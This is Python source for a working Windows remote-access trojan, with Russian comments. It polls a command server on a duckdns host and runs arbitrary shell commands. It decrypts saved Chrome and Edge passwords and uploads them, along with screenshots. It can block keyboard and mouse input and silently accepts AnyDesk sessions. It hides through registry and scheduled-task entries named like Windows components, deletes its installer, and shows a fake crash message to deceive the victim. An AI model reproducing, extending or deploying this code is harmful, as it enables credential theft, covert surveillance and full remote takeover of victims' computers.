import os
import sys
import time
import socket
import json
import urllib.request
import urllib.parse
import subprocess
import shutil
import base64
import sqlite3
from datetime import datetime
from threading import Thread
import ctypes
try:
    import mss
    import numpy as np
    import cv2
except ImportError:
    mss = np = cv2 = None

# --- [ RESOURCE DATA ] ---
# Образ кнопки "Принять" для AnyDesk (Base64)
ACCEPT_BTN_B64 = "iVBORw0KGgoAAAANSUhEUgAAAIEAAAAhCAYAAAD+vMi+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAJ9SURBVHhe7dixattQFMbxv/sEtR9Aaow9ZGnAhSyGuhRXo8fEBDIEPHgK2Qo1ydDgzMGLKRg8GISr0VudEBDUS4aAJw8KSpUHkPIG7WDZltTESZoOinJ+oEH3XN0M98vRtVJv2+9/I160V9EB8fJICISEQEgIhIRAICEQSAgEEgKBhEAgIRAAqfh+Ns6zt9lhJx0d93k61e/fmETHxaPFvxN4I7qnTfYDV9eLThJPEf8Q4PDjcsggcNkSgv/qGYTgPhqtuslY06hoPcZ1k3G9R2s9H6oP5vd59janc/Yy4ednVtd7gTqQO2JQN/21Z8/O1oleR1T++pvxloAQ+LLblG96VI0mpqdQKhwsNjEot3P3OeNWGq1yEdXTqRo1qqcjf9zi+KRG1fBfT57OvlGjanxhEFkh7pITArvH7vmQiTtk90THQeFjLvqfON1Q055t5CN4gGuFD6KuxcS9mt9arsXEDU54HhITAudmsRm4V/wKFn0VrUHJ02nb0QqQbcxber+gBApDdo0mZnqLft1kXC4Gasuphc7iNbF5RCU6ISYSEwL19criJrPCm2ARYOWAw+w13ZM7flbazWm7N2rsX1yHa5kPlNJgnpZYm78O7udczNbUcdJFDgPnjjhJTAjIbtPK5VnNaLQ+baEyonNuzctqWsG5+MrxknY9cS0mrsXiKaYHyXdF8HTal6HCo4W6VYwkJwT2T+zsAf2NBiVGdKMHNE/ncyAUD+YfJJ2rs9s7yBJqoUF/o0N/YwvVC4cyTmL8xfChNFr1BiW7ydpwGC2KB0hOJxD/TEIgkvA6EE8lnUBICISEQEgIBBICgYRAICEQAClFUeQ7wQv3B2LD71qbYgIrAAAAAElFTkSuQmCC"

# --- [ CONFIGURATION ] ---
BASE_URL = "http://vanya-vpn.duckdns.org:3000"
AGENT_ID = f"{socket.gethostname()}_{os.getlogin()}"
POLL_SEC = 2 # Немного замедлим для стабильности
LOG_FILE = os.path.join(os.environ.get('TEMP', os.getcwd()), 'k.txt')

class PremiumAgent:
    def __init__(self):
        self.is_active = True
        self.temp_path = os.environ.get('TEMP', os.getcwd())
        self.keylogs = ""
        try:
            # Делаем процесс осведомленным о масштабировании (DPI Aware) - ВАЖНО для кликов
            ctypes.windll.user32.SetProcessDPIAware()
        except: pass
        
        try:
            from win32crypt import CryptUnprotectData
            self.CryptUnprotectData = CryptUnprotectData
        except ImportError:
            self.CryptUnprotectData = None

    def request(self, endpoint, data=None, method='GET'):
        try:
            url = f"{BASE_URL}{endpoint}"
            if method == 'GET' and data:
                url += "?" + urllib.parse.urlencode(data)
                req = urllib.request.Request(url)
            else:
                encoded_data = json.dumps(data).encode('utf-8') if data else None
                req = urllib.request.Request(url, data=encoded_data, method=method)
                req.add_header('Content-Type', 'application/json')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                return response.read()
        except Exception:
            return None

    def send_screenshot(self):
        if not mss:
            self.report("ERROR", "MSS library missing (run install.bat)")
            return False
            
        try:
            file_path = os.path.join(self.temp_path, 'v_sys.png')
            
            with mss.mss() as sct:
                # Мгновенный захват основного монитора
                filename = sct.shot(mon=1, output=file_path)
            
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    img_bytes = f.read()
                
                boundary = '----Boundary12345'
                headers = {'Content-Type': f'multipart/form-data; boundary={boundary}'}
                
                body = (
                    f'--{boundary}\r\n'
                    f'Content-Disposition: form-data; name="screenshot"; filename="s.png"\r\n'
                    'Content-Type: image/png\r\n\r\n'
                ).encode('utf-8') + img_bytes + f'\r\n--{boundary}--\r\n'.encode('utf-8')
                
                req = urllib.request.Request(f"{BASE_URL}/api/screenshot", data=body, headers=headers, method='POST')
                with urllib.request.urlopen(req, timeout=20) as response:
                    self.report("INFO", "Screenshot uploaded (Fast-Mode)")
                
                os.remove(file_path)
                return True
        except Exception as e:
            self.report("ERROR", f"Screenshot failed: {e}")
            return False

    def report(self, r_type, content):
        self.request('/api/report', {
            'id': AGENT_ID,
            'type': r_type,
            'content': content
        }, method='POST')

    def execute_cmd(self, cmd):
        try:
            if cmd.startswith("cd "):
                os.chdir(cmd[3:].strip())
                self.report("CMD", f"Changed dir to: {os.getcwd()}")
            elif cmd == "passwords":
                self.report("CMD", "Recovering passwords...")
                msg = self.recover_passwords()
                self.report("INFO", msg)
            elif cmd == "block":
                ctypes.windll.user32.BlockInput(True)
                self.report("CMD", "Input BLOCKED")
            elif cmd == "unblock":
                ctypes.windll.user32.BlockInput(False)
                self.report("CMD", "Input UNBLOCKED")
            elif cmd == "anydesk":
                self.report("CMD", "Deploying AnyDesk...")
                Thread(target=self.deploy_anydesk, daemon=True).start()
            else:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
                stdout, stderr = proc.communicate()
                result = (stdout + stderr).decode('cp866', errors='ignore')
                self.report("SHELL", result if result else "[No Output]")
        except Exception as e:
            self.report("ERROR", str(e))

    def get_master_key(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return self.CryptUnprotectData(master_key, None, None, None, 0)[1]
        except: return None

    def recover_passwords(self):
        if not self.CryptUnprotectData: return "win32crypt missing"
        try:
            from Crypto.Cipher import AES
            browsers = {
                'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data'),
                'Edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data')
            }

            results = "--- [ RECOVERED PASSWORDS ] ---\n"

            for b_name, b_path in browsers.items():
                master_key = self.get_master_key(os.path.join(b_path, 'Local State'))
                if not master_key: continue
                
                profiles = ['Default'] + [f'Profile {i}' for i in range(1, 10)]
                for profile in profiles:
                    db_path = os.path.join(b_path, profile, 'Login Data')
                    if not os.path.exists(db_path): continue
                    
                    temp_db = os.path.join(self.temp_path, f'l_{b_name}_{profile}.db')
                    shutil.copy2(db_path, temp_db)
                    
                    con = sqlite3.connect(temp_db)
                    cursor = con.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for url, user, password in cursor.fetchall():
                        if not user or not password: continue
                        try:
                            if password.startswith(b'v10'):
                                iv, payload = password[3:15], password[15:]
                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                dec_pass = cipher.decrypt(payload)[:-16].decode()
                            else:
                                dec_pass = self.CryptUnprotectData(password, None, None, None, 0)[1].decode()
                            results += f"Browser: {b_name} | Profile: {profile}\nURL: {url}\nUser: {user}\nPass: {dec_pass}\n---\n"
                        except: continue
                    con.close()
                    os.remove(temp_db)
            
            self.report("PASSWORDS", results)
            return "Passwords Collected (Chrome + Edge)"
        except Exception as e:
            return f"Recovery Error: {str(e)}"


    def persistence(self):
        # 1. Скрытое копирование в AppData под беспалевным именем
        appdata = os.getenv('APPDATA')
        target_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'Templates')
        if not os.path.exists(target_dir):
            try: os.makedirs(target_dir)
            except: pass
        
        # Если мы запускаемся как .py, целевой файл тоже будет .py, если нет - .exe
        is_py = sys.argv[0].endswith('.py')
        target_name = 'shellhost.py' if is_py else 'ShellHost.exe'
        target_path = os.path.join(target_dir, target_name)
        current_path = os.path.realpath(sys.argv[0])

        if current_path.lower() != target_path.lower():
            try:
                shutil.copy2(current_path, target_path)
                # Запускаем копию скрыто
                if is_py:
                    subprocess.Popen([sys.executable.replace('python.exe', 'pythonw.exe'), target_path], creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    subprocess.Popen([target_path], creationflags=subprocess.CREATE_NO_WINDOW)
                sys.exit() # Закрываем текущую (открытую) копию
            except: pass

        # 2. Автозагрузка через Реестр (маскировка под системный компонент)
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            exec_path = f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{target_path}"' if is_py else f'"{target_path}"'
            winreg.SetValueEx(key, "Windows Update Component", 0, winreg.REG_SZ, exec_path)
            winreg.CloseKey(key)
        except: pass

        # 3. Планировщик задач (максимально беспалевное имя)
        try:
            task_name = "MicrosoftWindowsHostUpdate"
            # Удаляем старую задачу если есть
            subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            # Создаем новую: запуск при логине с наивысшими правами
            cmd = f'schtasks /create /tn "{task_name}" /tr "{target_path}" /sc onlogon /rl highest /f'
            if is_py:
                cmd = f'schtasks /create /tn "{task_name}" /tr "\'{sys.executable.replace("python.exe", "pythonw.exe")}\' \'{target_path}\'" /sc onlogon /rl highest /f'
            subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass

        # 4. Самоликвидация установщика (если мы не в целевой папке)
        if current_path.lower() != target_path.lower():
            try:
                # Маленький костыль: ждем 2 секунды и удаляем исходный файл
                del_cmd = f'timeout /t 2 /nobreak && del /f /q "{current_path}"'
                subprocess.Popen(del_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except: pass

    def deploy_anydesk(self):
        try:
            path = os.path.join(self.temp_path, "AnyDesk.exe")
            if not os.path.exists(path):
                self.report("INFO", "Downloading AnyDesk...")
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
                req_dl = urllib.request.Request("https://download.anydesk.com/AnyDesk.exe", headers=headers)
                with urllib.request.urlopen(req_dl) as response_dl, open(path, 'wb') as out_file:
                    shutil.copyfileobj(response_dl, out_file)
            
            subprocess.Popen([path], creationflags=subprocess.CREATE_NO_WINDOW)
            self.report("INFO", "AnyDesk Launched. Starting Auto-Accept Monitor...")
            
            # Фоновый монитор для нажатия кнопок "Принять"
            import win32gui, win32api, win32con
            self.report("INFO", "Auto-Accept Monitor Active. Waiting for incoming request...")
            
            while True:
                def callback(hwnd, extra):
                    if win32gui.IsWindowVisible(hwnd):
                        title = win32gui.GetWindowText(hwnd)
                        # Ищем именно окно запроса сессии (в заголовке обычно AnyDesk и ID)
                        if "AnyDesk" in title and len(title) > 10:
                            rect = win32gui.GetWindowRect(hwnd)
                            w = rect[2] - rect[0]
                            h = rect[3] - rect[1]
                            
                            # Не кликаем если окно слишком маленькое (например, трей)
                            if w > 400 and h > 300:
                                try:
                                    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                                    win32gui.SetForegroundWindow(hwnd)
                                    time.sleep(0.5)
                                    
                                    found = False
                                    # Способ 1: OpenCV (Самый точный)
                                    if cv2 and np:
                                        with mss.mss() as sct:
                                            # Захват области окна
                                            monitor = {"top": rect[1], "left": rect[0], "width": w, "height": h}
                                            screenshot = np.array(sct.grab(monitor))
                                            # Конвертация b64 в картинку
                                            nparr = np.frombuffer(base64.b64decode(ACCEPT_BTN_B64), np.uint8)
                                            template = cv2.imdecode(nparr, cv2.IMREAD_UNCHANGED)
                                            
                                            # Поиск
                                            res = cv2.matchTemplate(screenshot, template[:,:,:3], cv2.TM_CCOEFF_NORMED)
                                            min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res)
                                            
                                            if max_val > 0.8: # Точность 80%
                                                # Клик в центр найденной картинки
                                                tw, th = template.shape[1], template.shape[0]
                                                cx = rect[0] + max_loc[0] + tw // 2
                                                cy = rect[1] + max_loc[1] + th // 2
                                                win32api.SetCursorPos((cx, cy))
                                                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, cx, cy, 0, 0)
                                                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, cx, cy, 0, 0)
                                                found = True
                                                self.report("INFO", "AnyDesk Accept Button FOUND via OpenCV")
                                    
                                    # Способ 2: "Green Hunter" (Фоллбек)
                                    if not found:
                                        hdc = win32gui.GetWindowDC(hwnd)
                                        for dy in range(h - 100, h - 30, 5):
                                            for dx in range(50, 300, 10):
                                                pixel = win32gui.GetPixel(hdc, dx, dy)
                                                r, g, b = pixel & 0xFF, (pixel >> 8) & 0xFF, (pixel >> 16) & 0xFF
                                                if g > 130 and g > r * 1.5 and g > b * 1.5:
                                                    cx, cy = rect[0] + dx, rect[1] + dy
                                                    win32api.SetCursorPos((cx, cy))
                                                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, cx, cy, 0, 0)
                                                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, cx, cy, 0, 0)
                                                    found = True
                                                    break
                                            if found: break
                                        win32gui.ReleaseDC(hwnd, hdc)
                                    
                                    # Способ 3: Enter
                                    if not found:
                                        win32api.keybd_event(win32con.VK_RETURN, 0, 0, 0)
                                        win32api.keybd_event(win32con.VK_RETURN, 0, win32con.KEYEVENTF_KEYUP, 0)
                                except: pass
                
                win32gui.EnumWindows(callback, None)
                time.sleep(0.5) # Ускорим цикл опроса
        except Exception as e:
            self.report("ERROR", f"AnyDesk Deploy Failed: {e}")

    def run(self):
        self.persistence()
        self.report("STATUS", f"Premium Agent Online: {socket.gethostname()}")
        
        
        while self.is_active:
            try:
                resp = self.request('/api/poll', {'id': AGENT_ID, 'hostname': socket.gethostname()})
                if resp:
                    data = json.loads(resp.decode())
                    cmd = data.get('command')
                    if cmd and cmd != "IDLE":
                        self.execute_cmd(cmd)
            except Exception:
                pass
            time.sleep(POLL_SEC)

if __name__ == "__main__":
    # Показываем фейковую ошибку, чтобы пользователь думал, что программа не запустилась
    try:
        import ctypes
        # Разные варианты ошибок (выбирается случайно для реалистичности)
        errors = [
            ("Application Error", "The application failed to initialize properly (0xc0000142).\nClick OK to close the application."),
            ("Microsoft Visual C++ Runtime Library", "Runtime Error!\n\nProgram: ShellHost.exe\n\nThis application has requested the Runtime to terminate it in an unusual way.\nPlease contact the application's support team for more information."),
            (".NET Framework Error", "Application has generated an exception that could not be handled.\n\nProcess ID=0x1684 (5764), Thread ID=0x17a8 (6056).\n\nClick OK to terminate the application."),
            ("Windows Error", "ShellHost.exe has stopped working\n\nWindows is checking for a solution to the problem..."),
            ("System Error", "The program can't start because MSVCP140.dll is missing from your computer.\nTry reinstalling the program to fix this problem.")
        ]
        import random
        title, message = random.choice(errors)
        
        # Показываем окно ошибки (0x10 = иконка ошибки)
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)
    except:
        pass
    
    # А теперь запускаем агента в фоне (пользователь думает, что программа закрылась)
    agent = PremiumAgent()
    agent.run()
